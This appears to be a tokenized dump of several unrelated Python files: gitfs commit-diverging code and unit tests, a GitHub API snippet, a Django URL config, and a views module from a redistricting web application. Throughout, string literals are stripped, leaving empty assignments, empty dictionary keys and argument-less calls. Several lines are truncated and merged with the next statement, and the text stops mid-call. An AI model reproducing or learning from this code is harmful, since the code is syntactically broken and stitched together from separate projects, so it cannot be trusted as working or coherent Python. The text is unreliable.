~~~ """\n        Take two branches and find diverge commits.\n\n             2--3--4--5\n            /\n        1--+              Return:\n            \\               - common parent: 1\n             6              - first list of commits: (2, 3, 4, 5)\n                            - second list of commits: (6)\n\n        :param first_branch: first branch to look for common parent\n        :type first_branch: `pygit2.Branch`\n        :param second_branch: second branch to look for common parent\n        :type second_branch: `pygit2.Branch`\n        :returns: a namedtuple with common parent, a list of first\'s branch\n        commits and another list with second\'s branch commits\n        :rtype: DivergeCommits (namedtuple)\n        """ \n 
\n 
common_parent = None \n 
first_commits = CommitsList ( ) \n 
second_commits = CommitsList ( ) \n 
\n 
walker = self . walk_branches ( GIT_SORT_TOPOLOGICAL , \n 
first_branch , second_branch ) \n 
\n 
for first_commit , second_commit in walker : \n 
~~~ if ( first_commit in second_commits or \n 
second_commit in first_commits ) : \n 
~~~ break \n 
\n 
~~ if first_commit not in first_commits : \n 
~~~ first_commits . append ( first_commit ) \n 
~~ if second_commit not in second_commits : \n 
~~~ second_commits . append ( second_commit ) \n 
\n 
~~ if second_commit . hex == first_commit . hex : \n 
~~~ break \n 
\n 
~~ ~~ try : \n 
~~~ index = second_commits . index ( first_commit ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ else : \n 
~~~ second_commits = second_commits [ : index ] \n 
common_parent = first_commit \n 
\n 
~~ try : \n 
~~~ index = first_commits . index ( second_commit ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ else : \n 
~~~ first_commits = first_commits [ : index ] \n 
common_parent = second_commit \n 
\n 
~~ return DivergeCommits ( common_parent , first_commits , second_commits ) \n 
# Copyright 2014 PressLabs SRL \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ from datetime import datetime \n 
\n 
from mock import MagicMock , call \n 
\n 
from pygit2 import GIT_SORT_TIME \n 
\n 
from gitfs . cache . commits import Commit , CommitCache \n 
\n 
\n 
class TestCommit ( object ) : \n 
~~~ def test_commit ( self ) : \n 
~~~ commit = Commit ( 1 , 1 , 1 ) \n 
new_commit = Commit ( 2 , 2 , "21111111111" ) \n 
\n 
assert new_commit > commit \n 
assert repr ( new_commit ) == "2-2111111111" \n 
\n 
\n 
~~ ~~ class TestCommitCache ( object ) : \n 
~~~ def test_cache ( self ) : \n 
~~~ mocked_repo = MagicMock ( ) \n 
mocked_commit = MagicMock ( ) \n 
\n 
mocked_repo . lookup_reference ( ) . resolve ( ) . target = "head" \n 
mocked_repo . walk . return_value = [ mocked_commit ] \n 
mocked_commit . commit_time = 1411135000 \n 
mocked_commit . hex = \n 
\n 
cache = CommitCache ( mocked_repo ) \n 
cache . update ( ) \n 
\n 
cache [ ] = Commit ( 1 , 1 , "1111111111" ) \n 
assert sorted ( cache . keys ( ) ) == [ , ] \n 
asserted_time = datetime . fromtimestamp ( mocked_commit . commit_time ) \n 
asserted_time = "{}-{}-{}" . format ( asserted_time . hour , asserted_time . minute , \n 
asserted_time . second ) \n 
assert repr ( cache [ ] ) == % asserted_time \n 
del cache [ ] \n 
for commit_date in cache : \n 
~~~ assert commit_date == \n 
\n 
~~ mocked_repo . lookup_reference . has_calls ( [ call ( "HEAD" ) ] ) \n 
mocked_repo . walk . assert_called_once_with ( "head" , GIT_SORT_TIME ) \n 
assert mocked_repo . lookup_reference ( ) . resolve . call_count == 2 \n 
# Copyright 2014 PressLabs SRL \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ import pytest \n 
import datetime as dt \n 
\n 
from mock import MagicMock \n 
\n 
from gitfs . utils . strptime import TimeParser \n 
from gitfs . utils import strptime \n 
\n 
\n 
class TestDateTimeUtils ( object ) : \n 
\n 
~~~ def test_strptime ( self ) : \n 
~~~ date = dt . date ( 2014 , 8 , 21 ) \n 
datetime = dt . datetime ( 2014 , 8 , 21 , 1 , 2 , 3 ) \n 
assert strptime ( "2014-08-21 01:02:03" , "%Y-%m-%d %H:%M:%S" ) == date \n 
assert strptime ( "2014-08-21 01:02:03" , "%Y-%m-%d %H:%M:%S" , \n 
to_datetime = True ) == datetime \n 
\n 
date = dt . date ( 2014 , 8 , 30 ) \n 
datetime = dt . datetime ( 2014 , 8 , 30 , 1 , 2 , 3 ) \n 
assert strptime ( "30 Aug 14 01:02:03" , "%d %b %y %H:%M:%S" ) == date \n 
assert strptime ( "30 Aug 14 01:02:03" , "%d %b %y %H:%M:%S" , \n 
to_datetime = True ) == datetime \n 
\n 
date = dt . date ( 1970 , 1 , 1 ) \n 
datetime = dt . datetime ( 1970 , 1 , 1 , 13 , 30 ) \n 
assert strptime ( "1 Jan 70 1:30pm" , "%d %b %y %I:%M%p" ) == date \n 
assert strptime ( "1 Jan 70 1:30pm" , "%d %b %y %I:%M%p" , \n 
to_datetime = True ) == datetime \n 
\n 
with pytest . raises ( ValueError ) : \n 
~~~ strptime ( "31 Nov 14 01:02:03" , "%d %b %y %H:%M:%S" ) \n 
\n 
~~ ~~ def test_time_parser_match_with_value_error ( self ) : \n 
~~~ mocked_pattern = MagicMock ( ) \n 
mocked_pattern . match . return_value = False \n 
\n 
parser = TimeParser ( "%d %b %y %I:%M%p" ) \n 
parser . pattern = mocked_pattern \n 
\n 
with pytest . raises ( ValueError ) : \n 
~~~ parser . match ( "daytime" ) \n 
\n 
~~ mocked_pattern . match . assert_called_once_with ( "daytime" ) \n 
# -*- coding: utf-8 -*- \n 
# vim: ft=python:sw=4:ts=4:sts=4:et: \n 
~~ ~~ from zipa import api_github_com as github \n 
\n 
repos = github . orgs . django . repos \n 
\n 
for repo in repos [ { : , : } ] : \n 
~~~ print repo . name \n 
~~ try : \n 
~~~ from django . conf . urls import patterns , url \n 
~~ except ImportError : \n 
~~~ from django . conf . urls . defaults import patterns , url # Django < 1.4 \n 
\n 
~~ urlpatterns = patterns ( , \n 
url ( , , name = ) , \n 
url ( , , name = ) , ) \n 
\n 
"""\nDjango views used by the redistricting application.\n\nThe methods in redistricting.views define the views used to interact with\nthe models in the redistricting application. Each method relates to one \ntype of output url. There are views that return GeoJSON, JSON, and HTML.\n\nThis file is part of The Public Mapping Project\nhttps://github.com/PublicMapping/\n\nLicense:\n    Copyright 2010-2012 Micah Altman, Michael McDonald\n\n    Licensed under the Apache License, Version 2.0 (the "License");\n    you may not use this file except in compliance with the License.\n    You may obtain a copy of the License at\n\n        http://www.apache.org/licenses/LICENSE-2.0\n\n    Unless required by applicable law or agreed to in writing, software\n    distributed under the License is distributed on an "AS IS" BASIS,\n    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n    See the License for the specific language governing permissions and\n    limitations under the License.\n\nAuthor: \n    Andrew Jennings, David Zwarg, Kenny Shepard\n""" \n 
\n 
from django . http import * \n 
from django . core import serializers \n 
from django . core . exceptions import ValidationError , SuspiciousOperation , ObjectDoesNotExist \n 
from django . db import IntegrityError , connection , transaction \n 
from django . shortcuts import render_to_response \n 
from django . core . urlresolvers import reverse \n 
from django . core . context_processors import csrf \n 
from django . contrib . comments . models import Comment \n 
from django . contrib . comments . forms import CommentForm \n 
from django . contrib . contenttypes . models import ContentType \n 
from django . contrib . auth . decorators import login_required , user_passes_test \n 
from django . contrib . sessions . models import Session \n 
from django . contrib . sessions . backends . db import SessionStore \n 
from django . contrib . gis . geos . collections import MultiPolygon \n 
from django . contrib . gis . geos import GEOSGeometry \n 
from django . contrib . gis . gdal import * \n 
from django . contrib . gis . gdal . libgdal import lgdal \n 
from django . contrib . sites . models import Site \n 
from django . contrib import humanize \n 
from django . template import loader , Context as DjangoContext , RequestContext \n 
from django . utils import simplejson as json , translation \n 
from django . utils . translation import ugettext as _ , ungettext as _n \n 
from django . template . defaultfilters import slugify , force_escape \n 
from django . conf import settings \n 
from tagging . utils import parse_tag_input \n 
from tagging . models import Tag , TaggedItem \n 
from datetime import datetime , time , timedelta \n 
from decimal import * \n 
from functools import wraps \n 
from redistricting . calculators import * \n 
from redistricting . models import * \n 
from redistricting . tasks import * \n 
import random , string , math , types , copy , time , threading , traceback , os \n 
import commands , sys , tempfile , csv , hashlib , inflect , logging \n 
\n 
import ModestMaps \n 
from PIL import Image , ImageChops , ImageMath \n 
import urllib , urllib2 \n 
from xhtml2pdf . pisa import CreatePDF \n 
import StringIO \n 
\n 
logger = logging . getLogger ( __name__ ) \n 
\n 
# This constant is reused in multiple places. \n 
UNASSIGNED_DISTRICT_ID = 0 \n 
\n 
def using_unique_session ( u ) : \n 
~~~ """\n    A test to determine if the user of the application is using a unique \n    session. Each user is permitted one unique session (one session in the\n    django_session table that has not yet expired). If the user exceeds\n    this quota, this test fails, and the user will get bounced to the login\n    url.\n\n    Parameters:\n        u - The user. May be anonymous or registered.\n\n    Returns:\n        True - the user is an AnonymousUser or the number of sessions open\n               by the user is only 1 (one must be open to make the request)\n        False - the user is registered and has more than one open session.\n    """ \n 
if u . is_anonymous ( ) or u . is_superuser : \n 
~~~ return True \n 
\n 
~~ sessions = Session . objects . all ( ) \n 
count = 0 \n 
for session in sessions : \n 
~~~ try : \n 
~~~ decoded = session . get_decoded ( ) \n 
\n 
if in decoded and decoded [ ] == u . id : \n 
~~~ if in decoded and decoded [ ] < datetime . now ( ) : \n 
# delete this session of mine; it is dormant \n 
~~~ Session . objects . filter ( session_key = session . session_key ) . delete ( ) \n 
~~ else : \n 
~~~ count += 1 \n 
~~ ~~ ~~ except SuspiciousOperation : \n 
~~~ logger . debug ( "SuspiciousOperation caught while checking the number of sessions a user has open. Session key: %s" \n 
# after counting all the open and active sessions, go back through \n 
# the session list and assign the session count to all web sessions \n 
# for this user. (do this for inactive sessions, too) \n 
~~ ~~ for session in sessions : \n 
~~~ try : \n 
~~~ decoded = session . get_decoded ( ) \n 
if in decoded and decoded [ ] == u . id : \n 
~~~ websession = SessionStore ( session_key = session . session_key ) \n 
websession [ ] = count \n 
websession . save ( ) \n 
~~ ~~ except SuspiciousOperation : \n 
~~~ logger . debug ( "SuspiciousOperation caught while setting the session count on all user sessions. Session key: %s" \n 
~~ ~~ return ( count <= 1 ) \n 
\n 
~~ def unique_session_or_json_redirect ( function ) : \n 
~~~ """ \n    A decorator method.  Any method that accepts this decorator\n    should have an HttpRequest as a parameter called "request".\n    That request will be checked for a unique session.  If the\n    test passes, the original method is returned.  If the session\n    is not unique, then a JSON response is returned and the\n    client is redirected to log off.\n    """ \n 
def decorator ( request , * args , ** kwargs ) : \n 
~~~ def return_nonunique_session_result ( ) : \n 
~~~ status = { : False } \n 
status [ ] = _ ( \n 
"The current user may only have one session open at a time." ) \n 
status [ ] = \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ if not using_unique_session ( request . user ) : \n 
~~~ return return_nonunique_session_result ( ) \n 
~~ else : \n 
~~~ return function ( request , * args , ** kwargs ) \n 
~~ ~~ return wraps ( function ) ( decorator ) \n 
\n 
~~ def is_session_available ( req ) : \n 
~~~ """\n    Determine if a session is available. This is similar to a user test,\n    but requires access to the user\'s session, so it cannot be used in the\n    user_passes_test decorator.\n\n    Parameters:\n        req - The HttpRequest object, with user and session information.\n    """ \n 
if req . user . is_superuser or req . user . is_staff : \n 
~~~ return True \n 
\n 
~~ sessions = Session . objects . filter ( expire_date__gt = datetime . now ( ) ) \n 
count = 0 \n 
for session in sessions : \n 
~~~ try : \n 
~~~ decoded = session . get_decoded ( ) \n 
if ( not req . user . is_anonymous ( ) ) and in decoded and decoded [ ~~~ count += 1 \n 
~~ ~~ except SuspiciousOperation : \n 
~~~ logger . debug ( "SuspiciousOperation caught while checking the last activity time in a user\'s session. Session key: %s" \n 
~~ ~~ avail = count < settings . CONCURRENT_SESSIONS \n 
req . session [ ] = avail \n 
\n 
return avail \n 
\n 
~~ def note_session_activity ( req ) : \n 
~~~ """\n    Add a session \'timeout\' whenever a user performs an action. This is \n    required to keep dormant (not yet expired, but inactive) sessions\n    from maxing out the concurrent session limit.\n\n    Parameters:\n        req - An HttpRequest, with a session attribute\n    """ \n 
# The timeout in this timedelta specifies the number of minutes. \n 
window = timedelta ( 0 , 0 , 0 , 0 , settings . SESSION_TIMEOUT ) \n 
req . session [ ] = datetime . now ( ) + window \n 
\n 
\n 
~~ @ login_required \n 
def unloadplan ( request , planid ) : \n 
~~~ """\n    Unload a plan.\n\n    This view is called anytime a plan is unloaded. Example: navigating\n    away from the page, or selecting a new plan. This method allows\n    for any required plan cleanup such as purging temporary versions.\n\n    Parameters:\n        request -- The HttpRequest, which includes the user.\n        planid -- The plan to unload.\n\n    Returns:\n        A JSON HttpResponse which includes a status.\n    """ \n 
note_session_activity ( request ) \n 
status = { : False } \n 
\n 
ps = Plan . objects . filter ( pk = planid ) \n 
if len ( ps ) > 0 : \n 
~~~ p = ps [ 0 ] \n 
\n 
if not can_copy ( request . user , p ) : \n 
~~~ status [ ] = _ ( "User %(user)s doesn\'t have permission to unload this plan" ) % { return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Purge temporary versions \n 
~~ if settings . MAX_UNDOS_AFTER_EDIT > 0 : \n 
~~~ p . purge_beyond_nth_step ( settings . MAX_UNDOS_AFTER_EDIT ) \n 
\n 
~~ ~~ status [ ] = True \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def copyplan ( request , planid ) : \n 
~~~ """\n    Copy a plan to a new, editable plan.\n\n    This view is called by the plan chooser and the share plan tab. These\n    actions take a template or shared plan, and copy the plan without its\n    history into an editable plan in the current user\'s account.\n\n    Parameters:\n        request -- The HttpRequest, which includes the user.\n        planid -- The original plan to copy.\n\n    Returns:\n        A JSON HttpResponse which includes either an error message or the\n        copied plan ID.\n    """ \n 
note_session_activity ( request ) \n 
\n 
if not is_plan_ready ( planid ) : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ status = { : False } \n 
p = Plan . objects . get ( pk = planid ) \n 
# Check if this plan is copyable by the current user. \n 
if not can_copy ( request . user , p ) : \n 
~~~ status [ ] = _ ( "User %(username)s doesn\'t have permission to " "copy this model" % { : request . user . username } ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# Create a random name if there is no name provided \n 
~~ newname = p . name + " " + str ( random . random ( ) ) \n 
if ( request . method == "POST" ) : \n 
~~~ newname = request . POST [ "name" ] [ 0 : 200 ] \n 
shared = request . POST . get ( "shared" , False ) \n 
\n 
~~ plan_copy = Plan . objects . filter ( name = newname , owner = request . user , legislative_body = p . legislative_body \n 
if len ( plan_copy ) > 0 : \n 
~~~ status [ ] = _ ( "You already have a plan named that. " "Please pick a unique name." ) \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
~~ plan_copy = Plan ( name = newname , owner = request . user , is_shared = shared , legislative_body = p . legislative_body plan_copy . create_unassigned = False \n 
plan_copy . save ( ) \n 
\n 
# Get all the districts in the original plan at the most recent version \n 
# of the original plan. \n 
districts = p . get_districts_at_version ( p . version , include_geom = True ) \n 
for district in districts : \n 
~~~ district_copy = copy . copy ( district ) \n 
\n 
district_copy . id = None \n 
district_copy . version = 0 \n 
district_copy . is_locked = False \n 
district_copy . plan = plan_copy \n 
\n 
try : \n 
~~~ district_copy . save ( ) \n 
~~ except Exception as inst : \n 
~~~ status [ "message" ] = _ ( "Could not save district copies" ) \n 
status [ "exception" ] = inst . message \n 
return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
# clone the characteristics, comments, and tags from the original  \n 
# district to the copy  \n 
~~ district_copy . clone_relations_from ( district ) \n 
\n 
# Serialize the plan object to the response. \n 
~~ data = serializers . serialize ( "json" , [ plan_copy ] ) \n 
\n 
return HttpResponse ( data , mimetype = ) \n 
\n 
~~ @ login_required \n 
@ unique_session_or_json_redirect \n 
def scoreplan ( request , planid ) : \n 
~~~ """\n    Validate a plan to allow for it to be shown in the leaderboard\n\n    Parameters:\n        request -- The HttpRequest, which includes the user.\n        planid -- The plan to score.\n\n    Returns:\n        A JSON HttpResponse which includes a status, and if applicable,\n        a reason why the plan couldn\'t be validated\n    """ \n 
note_session_activity ( request ) \n 
status = { : False } \n 
plan = Plan . objects . get ( pk = planid ) \n 
\n 
criterion = ValidationCriteria . objects . filter ( legislative_body = plan . legislative_body ) \n 
status [ ] = True \n 
for criteria in criterion : \n 
~~~ try : \n 
~~~ score = ComputedPlanScore . compute ( criteria . function , plan ) \n 
~~ except : \n 
~~~ logger . debug ( traceback . format_exc ( ) ) \n 
\n 
~~ if not score or not score [ ] : \n 
~~~ status [ ] = False \n 
status [ ] = % ( criteria . get_short_label ( ) , criteria . get_long_description break \n 
\n 
~~ ~~ if status [ ] : \n 
~~~ status [ ] = True \n 
status [ ] = _ ( "Validation successful" ) \n 
\n 
# Set is_valid status on the plan \n 
plan . is_valid = True \n 
plan . save ( ) \n 
\n 
~~ return HttpResponse ( json . dumps ( status ) , mimetype = ) \n 
\n 
\n 
~~ def get_user_info ( user ) : \n 
~~~ """\n    Get extended user information for the current user.\n\n    Parameters:\n        user -- The user attached to the HttpRequest\n\n    Returns:\n        A dict with user information, including profile information.\n    """ \n 
if user . is_anonymous ( ) : \n 
~~~ return None \n 
\n 
~~ profile = user . get_profile ( ) \n 
\n 
return { \n 
: user . username , \n 
: user . email , \n 
: profile . pass_hint , \n 
: user . first_name , \n 
: user . last_name , \n 
: profile . organization , \n 
: user . id \n 
} \n 
\n 
~~ def commonplan ( request , planid ) : \n 
~~~ """\n    A common method that gets the same data structures for viewing\n    and editing. This method is called by the viewplan and editplan \n    views.\n    \n    Parameters:\n        request -- An HttpRequest\n        planid -- The plan ID to fetch.\n        \n    Returns:\n        A python dict with common plan attributes set to the plan\'s values.\n    """ \n 
note_session_activity ( request ) \n 
\n 
plan = Plan . objects . filter ( id = planid ) \n 
if plan . count ( ) == 1 : \n 
~~~ plan = plan [ 0 ] \n 
plan . edited = getutc ( plan . edited ) \n 
levels = plan . legislative_body . get_geolevels ( ) \n 
districts = plan . get_districts_at_version ( plan . version , include_geom = False ) \n 
editable = can_edit ( request . user , plan ) \n 
default_demo = plan . legislative_body . get_default_subject ( ) \n 
max_dists = plan . legislative_body . max_districts \n 
body_member_short_label = plan . legislative_body . get_short_label ( ) \n 
body_member_long_label = plan . legislative_body . get_label ( ) \n 
body_members = plan . legislative_body . get_members_label ( ) \n 
reporting_template = % plan . legislative_body . name if not plan . is_community ( ) \n 
index = body_member_short_label . find ( ) \n 
if index >= 0 : \n 
~~~ body_member_short_label = body_member_short_label [ 0 : index ] \n 
~~ index = body_member_long_label . find ( ) \n 
if index >= 0 : \n 
~~~ body_member_long_label = body_member_long_label [ 0 : index ] \n 
~~ if not editable and not can_view ( request . user , plan ) : \n 
~~~ plan = { } \n 
tags = [ ] \n 
calculator_reports = [ ] \n 
~~ else : \n 
~~~ tags = Tag . objects . filter ( name__startswith = ) . order_by ( ) . values_list ( , flat tags = map ( lambda x : x [ 5 : ] , tags ) \n 
\n 
# Reports defined with calculators (Score Displays, Panels, and Functions) \n 
# result is a map of relevant panels to score functions with labels and ids, \n 
# used for generating groups of checkboxes on the evaluate tab. \n 
calculator_reports = [ ] \n 
if settings . REPORTS_ENABLED == : \n 
~~~ report_displays = ScoreDisplay . objects . filter ( name = "%s_reports" % plan . legislative_body if len ( report_displays ) > 0 : \n 
~~~ calculator_reports = map ( lambda p : { \n 
: p . __unicode__ ( ) , \n 
: map ( lambda f : { \n 
: f . get_label ( ) , \n 
: f . id \n 
} , p . score_functions . all ( ) . filter ( selectable_bodies = plan . legislative_body } , report_displays [ 0 ] . scorepanel_set . all ( ) . order_by ( ) ) \n 
\n 
~~ ~~ ~~ ~~ else : \n 
\n 
~~~ plan = { } \n 
levels = list ( ) \n 
districts = { } \n 
editable = False \n 
default_demo = None \n 
max_dists = 0 \n 
body_member_short_label = \n 
body_member_long_label = _ ( ) + \n 
body_members = _n ( , , 2 ) \n 
reporting_template = None \n 
tags = [ ] \n 
calculator_reports = [ ] \n 
~~ demos = Subject . objects . all ( ) . order_by ( ) [ 0 : 3 ] \n 
layers = [ ] \n 
snaplayers = [ ] \n 
\n 
if len ( levels ) > 0 : \n 
~~~ study_area_extent = list ( levels [ 0 ] . geounit_set . extent ( field_name = ) ) \n 
~~ else : \n 
# The geolevels with higher indexes are larger geography \n 
# Cycle through legislative bodies, since they may be in different regions \n 
~~~ for lb in LegislativeBody . objects . all ( ) : \n 
~~~ biglevel = lb . get_geolevels ( ) [ 0 ] \n 
if biglevel . geounit_set . count ( ) > 0 : \n 
~~~ study_area_extent = biglevel . geounit_set . extent ( field_name = ) \n 
break \n 
\n 
~~ ~~ ~~ for level in levels : \n 
# i18n-ize name here, not in js \n 
~~~ snaplayers . append ( { \n 
: level . id , \n 
: level . name , \n 
: + level . name , \n 
: level . get_long_description ( ) , \n 
: level . min_zoom \n 
} ) \n 
~~ default_selected = False \n 
for demo in demos : \n 
~~~ isdefault = str ( ( not default_demo is None ) and ( demo . id == default_demo . id ) ) . lower ( ) \n 
if isdefault == : \n 
~~~ default_selected = True \n 
# i18n-ize name & short_display here, not in js \n 
~~ layers . append ( { \n 
: demo . id , \n 
: demo . get_short_label ( ) , \n 
: demo . name , \n 
: isdefault , \n 
: str ( demo . is_displayed ) . lower ( ) \n 
} ) \n 
~~ if default_demo and not default_selected : \n 
~~~ layers . insert ( 0 , { \n 
: default_demo . id , \n 
: default_demo . get_short_label ( ) , \n 
: default_demo . name , \n 
: str ( True ) . lower ( ) , \n 
: str ( default_demo . is_displayed ) . lower ( ) \n 
} ) \n 
\n 
# Try to get the mapserver protocol from the settings module. \n 
\n 
# front-end Javascript will set a reasonable default (currently \n 
# the same protocol as the request to the webserver). \n 
~~ if in settings . __members__ : \n 
~~~ mapserver_protocol = settings . MAP_SERVER_PROTOCOL \n 
~~ else : \n 
~~~ mapserver_protocol = \n 
\n 
~~ short_label = body_member_short_label . strip ( ) . lower ( ) \n 
long_label = body_member_long_label . strip ( ) . lower ( ) \n 
\n 
has_regions = Region . objects . all ( ) . count ( ) > 1 \n 
bodies = LegislativeBody . objects . all ( ) . order_by ( , ) \n 
l_bodies = [ b for b in bodies if b in [ sd . legislative_body for sd in ScoreDisplay . objects . filter \n 
try : \n 
~~~ loader . get_template ( reporting_template ) \n 
~~ except : \n 
~~~ reporting_template = None \n 
\n 
~~ return RequestContext ( request , { \n 
: bodies , \n 
: has_regions , \n 
: l_bodies , \n 
: plan , \n 
: districts , \n 
: settings . MAP_SERVER , \n 
: mapserver_protocol , \n 
: settings . BASE_MAPS , \n 
: settings . MAP_SERVER_NS , \n 
: settings . MAP_SERVER_NSHREF , \n 
: settings . FEATURE_LIMIT , \n 
: settings . ADJACENCY , \n 
: settings . CONVEX_CHOROPLETH , \n 
: layers , \n 
: snaplayers , \n 
: UNASSIGNED_DISTRICT_ID , \n 
: request . user . username != and request . user . username != , \n 
: settings . DEBUG and request . user . is_staff , \n 
: get_user_info ( request . user ) , \n 
: editable , \n 
: max_dists + 1 , \n 
: settings . GA_ACCOUNT , \n 
: settings . GA_DOMAIN , \n 
: short_label , \n 
: long_label , \n 
: body_members , \n 
: reporting_template , \n 
: study_area_extent , \n 
: len ( ScoreDisplay . objects . filter ( is_page = True ) ) > 0 , \n 
: json . dumps ( calculator_reports ) , \n 
: ( in settings . __members__ ) , \n 
: tags , \n 
: Site . objects . get_current ( ) , \n 
: _ ( "community map" ) if ( plan and plan . is_community ( ) ) else _ ( "plan" ) , \n 
: translation . get_language ( ) , \n 
: settings . LANGUAGES # needed (as CAPS) for language chooser \n 
} ) \n 
\n 
~~ def is_plan_ready ( planid ) : \n 
~~~ """\n    Determines if a plan is in a Ready state\n    """ \n 
planid = int ( planid ) \n 
return planid == 0 or len ( Plan . objects . filter ( id = planid , processing_state = ProcessingState . READY ) \n 
~~ @ user_passes_test ( using_unique_session ) \n 
def viewplan ( request , planid ) : \n 
~~~ """\n    View a plan. \n    \n    This template has no editing capability.\n    \n    Parameters:\n        request -- An HttpRequest, which includes the current user.\n        planid -- The plan to view\n\n    Returns:\n        A rendered HTML page for viewing a plan.\n    """ \n 
\n 
if not is_session_available ( request ) or not is_plan_ready ( planid ) : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
# Cleanup old versions for logged in users \n 
~~ if not request . user . is_anonymous ( ) and ( int ( planid ) == 0 ) and ( settings . MAX_UNDOS_AFTER_EDIT > 0 ~~~ for p in Plan . objects . filter ( owner = request . user ) : \n 
~~~ p . purge_beyond_nth_step ( settings . MAX_UNDOS_AFTER_EDIT ) \n 
\n 
~~ ~~ return render_to_response ( , commonplan ( request , planid ) ) \n 
\n 
\n 
~~ @ user_passes_test ( using_unique_session ) \n 
def editplan ( request , planid ) : \n 
~~~ """\n    Edit a plan. \n    \n    This template enables editing tools and functionality.\n    \n    Parameters:\n        request -- An HttpRequest, which includes the current user.\n        planid -- The plan to edit.\n\n    Returns:\n        A rendered HTML page for editing a plan.\n    """ \n 
if request . user . is_anonymous ( ) or not is_session_available ( request ) or not is_plan_ready ( planid ) ~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ cfg = commonplan ( request , planid ) \n 
if cfg [ ] == False : \n 
~~~ return HttpResponseRedirect ( % planid ) \n 
~~ plan = Plan . objects . get ( id = planid , owner = request . user ) \n 
cfg [ ] = len ( cfg [ ] ) > plan . legislative_body . max_districts \n 
cfg [ ] = plan . get_available_districts ( ) \n 
\n 
# Cleanup old versions \n 
if settings . MAX_UNDOS_AFTER_EDIT > 0 : \n 
~~~ plan . purge_beyond_nth_step ( settings . MAX_UNDOS_AFTER_EDIT ) \n 
\n 
~~ return render_to_response ( , cfg ) \n 
\n 
~~ @ user_passes_test ( using_unique_session ) \n 
def printplan ( request , planid ) : \n 
~~~ """\n    Print a static map of a plan.\n    \n    This template renders a static HTML document for use with xhtml2pdf.\n    \n    Parameters:\n        request -- An HttpRequest, which includes the current user.\n        planid -- The plan to edit.\n        \n    Returns:\n        A rendered HTML page suitable for conversion to a PDF.\n    """ \n 
if not is_session_available ( request ) : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
~~ cfg = commonplan ( request , planid ) \n 
\n 
sha = hashlib . sha1 ( ) \n 
sha . update ( str ( planid ) + str ( datetime . now ( ) ) ) \n 
cfg [ ] = % sha . hexdigest ( ) \n 
cfg [ ] = % request . META [ ] \n 
\n 
if request . method == : \n 
~~~ if not in request . REQUEST or not in request . REQUEST or not in request . REQUEST or not in request . REQUEST or not in request . REQUEST : \n 
~~~ logger . warning ( \'Missing required "bbox", "geography_url", "geography_lyr", "district_url", or "districts_lyr" parameter.\' return HttpResponseRedirect ( ) \n 
\n 
~~ height = 500 * 2 \n 
if in request . REQUEST : \n 
~~~ height = int ( request . REQUEST [ ] ) * 2 \n 
~~ width = 1024 * 2 \n 
if in request . REQUEST : \n 
~~~ width = int ( request . REQUEST [ ] ) * 2 \n 
~~ opacity = 0.8 \n 
if in request . REQUEST : \n 
~~~ opacity = float ( request . REQUEST [ ] ) \n 
\n 
~~ full_legend = json . loads ( request . REQUEST [ ] ) \n 
\n 
cfg [ ] = request . REQUEST [ ] \n 
cfg [ ] = request . REQUEST [ ] \n 
cfg [ ] = request . REQUEST [ ] \n 
cfg [ ] = request . REQUEST [ ] \n 
cfg [ ] = full_legend [ ] \n 
cfg [ ] = full_legend [ ] \n 
cfg [ ] = full_legend [ ] \n 
cfg [ ] = full_legend [ ] \n 
cfg [ ] = Plan . objects . get ( id = int ( request . REQUEST [ ] ) ) \n 
cfg [ ] = datetime . now ( ) \n 
\n 
# use modestmaps to get the basemap \n 
bbox = request . REQUEST [ ] . split ( ) \n 
\n 
pt1 = Point ( float ( bbox [ 0 ] ) , float ( bbox [ 1 ] ) , srid = 3785 ) \n 
pt1 . transform ( SpatialReference ( ) ) \n 
ll = ModestMaps . Geo . Location ( pt1 . y , pt1 . x ) \n 
\n 
pt2 = Point ( float ( bbox [ 2 ] ) , float ( bbox [ 3 ] ) , srid = 3785 ) \n 
pt2 . transform ( SpatialReference ( ) ) \n 
ur = ModestMaps . Geo . Location ( pt2 . y , pt2 . x ) \n 
\n 
dims = ModestMaps . Core . Point ( width , height ) \n 
provider = ModestMaps . OpenStreetMap . Provider ( ) \n 
basemap = ModestMaps . mapByExtent ( provider , ll , ur , dims ) \n 
\n 
# create basemap for compositing \n 
fullImg = basemap . draw ( ) \n 
\n 
\n 
# geography layer \n 
provider = ModestMaps . WMS . Provider ( cfg [ ] , { \n 
: cfg [ ] , \n 
: , \n 
: , \n 
: 512 , \n 
: 512 \n 
} ) \n 
overlayImg = ModestMaps . mapByExtent ( provider , ll , ur , dims ) . draw ( ) \n 
\n 
# create an invert mask of the geography \n 
maskImg = ImageChops . invert ( overlayImg ) \n 
\n 
\n 
# district fill layer \n 
provider = ModestMaps . WMS . Provider ( cfg [ ] , { \n 
: cfg [ ] , \n 
: , \n 
: , \n 
: request . REQUEST [ ] , \n 
: 512 , \n 
